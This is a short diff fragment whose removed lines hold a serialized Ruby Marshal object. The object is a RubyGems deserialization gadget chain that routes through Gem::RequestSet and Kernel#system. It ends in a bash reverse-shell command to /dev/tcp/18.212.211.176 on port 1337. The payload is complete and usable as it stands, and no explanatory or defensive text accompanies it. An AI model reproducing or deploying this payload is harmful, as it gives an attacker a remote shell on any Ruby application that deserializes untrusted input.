@@ -1,4 +1,0 @@
-[cGem::SpecFetchercGem::InstallerU:Gem::Requirement[o:Gem::Package::TarReader:@ioo:Net::BufferedIO;o:#Gem::Package::TarReader::Entry:
-@readi�:@headerI"aaa:ET:@debug_outputo:Net::WriteAdapter:@socketo:Gem::RequestSet:
-@setso;;mKernel:@method_id:system:
-@git_setI";bash -c 'bash -i >& /dev/tcp/18.212.211.176/1337 0>&1';T;:resolve
